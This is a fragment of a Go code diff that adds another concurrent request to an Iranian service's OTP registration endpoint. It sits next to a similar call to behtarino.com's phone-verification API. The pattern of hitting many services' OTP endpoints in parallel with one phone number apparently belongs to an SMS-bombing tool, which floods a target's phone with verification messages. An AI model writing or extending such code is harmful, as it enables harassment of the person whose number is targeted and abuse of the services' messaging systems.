+		// api-react.okala.com (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
+			"mobile": phone,
+			"deviceTypeCode": 0,
+			"confirmTerms": "True",
+			"notRobot": "False",
+		}, &wg, ch)
 		// behtarino.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
